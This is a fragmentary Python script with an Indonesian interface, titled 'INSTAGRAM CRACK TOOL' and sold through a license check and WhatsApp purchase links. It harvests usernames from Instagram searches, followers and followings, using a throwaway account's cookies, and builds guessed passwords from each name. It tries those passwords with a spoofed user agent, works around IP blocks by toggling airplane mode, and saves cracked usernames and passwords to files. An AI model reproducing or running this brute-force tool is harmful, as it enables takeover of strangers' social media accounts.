...
def banner():
	clear()
	wel='# WELCOME TO INSTAGRAM CRACK TOOL'
...
def loadinglisen():
    ...
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {P}Sedang mengcek lisensi{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		
try:
    # python 2
...
def login_kamu():
    if "sukses" in lisensiku:
        try:
            ...
            banner()
            cetak(nel('[white][1] LOGIN MENGUNAKAN COOKIES TUMBAL\n[2] LOGIN MENGUNAKAN PASSWORD/USER TUMBAL[red]OFF',title=f'[blue]LOGIN',style='blue'))
            loginpil=input(f"MASUKAN PILIHANMU... : {C} ")
            if loginpil=='1':
                wel = '# DI LARANG MENGUNAKAN AKUN PRIVATE'
                wel2 = mark(wel, style='red')
                sol().print(wel2)
                us=input(f'Username : {C}')
                cok=input(f'Cookie : {C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username.txt','w').write(us)
	...
	def logo(self):
		for i in external:
			try:
				...
				pass
				wel='# CRAKING INPUT MENU TOOL'
				cik2=mark(wel ,style='bold cyan')
				sol().print(cik2)
				cetak(nel("""[blue][[green]01[blue]] CRACK DARI PENCARIAN USERNAME [[green]INSTGRAM[white]]
[blue][[green]02[blue]] CRACK DARI PENGIKUT [[green]INSTGRAM[white]]
[blue][[green]03[blue]] CRACK MENGIKUTI [[green]INSTGRAM[white]]
[blue]
[blue][[green]04[blue]] CEK OPSI AKUN CHEKPOINT [[green]INSTGRAM[white]]
[blue][[green]05[blue]] CEK HASIL AKUN [[green]INSTGRAM[white]]
[blue][[green]Ee[blue]] EXIT [[red]DI MENU[white]]"""))
	def BUG(self):
		exit()
	...
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				...
				cetak(nel(f"""[white][[red]![white]] TEMEN YANG ANDA MASUKAN TIDAK LAH PUBLIK ATAU BISA CEK ULANG COOKIES ANDA"""))
			return idx
		else:lisensi()
	...
	def infoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				...
				exit(f'\n{M}SEPERTI NYA JARINGAN ANDA TODAK SETABL{C}')
			except Exception as e:
				print(f'\n{M}USERNAME TIDAK DI TEMUKAN{N}')
			return internal
		else:lisensi()
	...
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				...
				exit(f'\n{M}SEPERTI NYA JARINGAN ANDA TIDAK STABIL{C}')
			except Exception as e:
				print(f'\n{M}USERNAME TIDA ADA{N}')
			return internal
		else:lisensi()
	...
	def useragent(self):
	       ...
	       useragent = f'''Mozilla/5.0 (Linux; Android 10; SM-A920F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;] [ip:93.66.143.55]'''
	       return useragent

	def passwordAPI(self,xnx):
		ceta(nel("""[green][[blue]01[green]][white] name,name123"""))
		cetak(nel("""[green][[blue]02[green]] [white]name,name1233,name1234,name12345"""))
		c=input(f'{N}PILIH :{C} ')
		fs = input(f'{P}[?] TAMBAH KAN PASSWORD MANUAL?(y/t) : ')
		cetak(nel("""[green][[blue]01[green]] [white]AJAX\n[green][[blue]02[gree]] [white]CLASIC"""))
		aj = input(f'{P}METODE : ')
		if fs in ['y','Y']:
			je = input('masukan password manual gunakan tanda ,untuk menyatu kan password : ')
		if c=='1':
		...
		if fs in ['y','Y']:
		    ...
		    sol().print(uu)
		    print('')
		    zx=input(f'{N}[•] sambungan,kata : {N} ')
		    self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		ipku=' [white][[red]•[white]] [white] MODE PESAWAT SETIAP [green]300[white] USERNAME TERKUMPUL'
		ipku1=nel(ipku,style='red')
		sol().print(ipku1)
	...
	def crackAPI(self,user,pas):
		...
		sys.stdout.write(f"\r{N}[{M}MULTI{N}] {N}[{loop}/{len(internal)}] {P} LIVE- {H} {len(success)}{C}  {P} CHEKPOINT- {K} {len(checkpoint)} {N}"),sys.stdout.flush()
		try:
			for pw in pas:
...
{P}[{H}√{P}] ID : {H}{user}
{P}[{H}√{P}] PASSWORD : {H}{pw}
{P}[{H}√{P}] PENGIKUT : {H}{pengikut} 
{P}[{H}√{P}] MENGIKUTI : {H}{mengikut}
{P}[{H}√{P}] POSTINGAN : {H}{postingan}
{P}[{H}√{P}] USER-AGENT SC : {H}{uaku}""")
					...
					print(f"""'{P}
[{K}×{P}] NAMA :{K}{nama}
{P}[{K}×{P}] USERNAME :{K} {user}
{P}[{K}×{P}] PASSWORD INSTA :{K} {pw}
{P}[{K}×{P}] PENGIKUT  : {K}{pengikut}""")
					open(f"result/CHECK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'ip_block' in str(respon.text):
					sys.stdout.write(f"\r[{M}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
	...
	def menu(self):
		...
		os.system('clear')
		banner()
		cetak(nel("""[blue][[green]01[blue]] [white]CRACK DARI PENCARIAN USERNAME
[blue][[green]02[blue]] [white]CRACK DARI PENGIKUT
[blue][[green]03[blue]] [white]CRACK DARI MENGIKUTI
[blue][[green]04[blue]] [white]CEK OPSI AKUN CP/CHEKPOINT
[blue][[green]Ee[blue]] [white]EXIT""",title="MENU INSTGRAM"))
		c=input(f'  {N}[•] Pilih :{C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			j= '[red][!] MENU 1SEDANG DALAM UPDATE [/red]'
			i=nel(j,style='')
			...
			#massal(self)
			mas=input(f'{h}[{H}•{h}] {P}ingin crack massal wahai penguna m/p : ')
			if mas in ['m','M']:
				masal(self)
			elif mas in ['p','P']:
				massal(self)
...
def meng(self):
	try:
		menudump.append('mengikuti')
		mas='[[red]![white]] [white]Target harus bersifat publik jangan privat'
		mas1=nel(mas,style='cyan')
		sol().print(mas1)
...
def masal(self):
			try:
				...
				m=int(input(f'  {P}[?] mau crack massal atau biasa? y/t :  {N}'))
			except:m=1
			for t in range(m):
				t +=1
				nama=input(f' Masukan Username : ')
			#	console.print(Columns(bo))
				id=self.idAPI(self.cookie,nama)
...
def tlisensi():
    ...
    if lisen in ['']:
     ...
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6285719392947?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
...
def lisensi():
 try:
  ...
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyNzI2NTQ4NiIsIjBwVHFobzhOOGkza0E1cjR4SVh1Zmg1ZktXMmtoZXRKRWRZNW1PaWYiXQ==&ProductId=17169&Key='+lisensikuni[0]).json()
...
def massal(self):
			menudump.append('pengikut')
			m=input(f'  {N}Username target : {C}')
			cetak(nel(f'[white][[red]•[white]] SEDANG MENGUMPUL KAN USERNAME....'))
...
def pilu():
	banner()
	da = input(f'{P}[{B}01{P}] Masukan lisensi\n[{B}02{P}] Beli lisensi\nPILIH : ')
	if da in['1','01']:
		sha = input(f'{P}{P}[{H}•{P}] lisensi :  ')
		if sha in ['GBDA-JUSG-AJOS-BDGS']:
			loadinglisen()
			print(f'{P}[{H}√{P}] LISENSI BERHASIL ')
			login_kamu()
		else:
			loadinglisen()
			print(f'{P}[{M}×{P}] GAGAL LISENSI SILAKAN BELI TERLEBIH DAHULU....')
			exit()
	elif da in ['2','02']:
		cetak(nel("""ANDA AKAN DI ARIHKAN MENUJU WA"""))
		os.system('xdg-open http://wa.me/6283862287464?text=bang+gw+mo+beli+lisensi')
		webbrowser.open('http://wa.me/6283862287464?text=banh+gw+mau+beli+lisensi+nya+dong')
		exit()
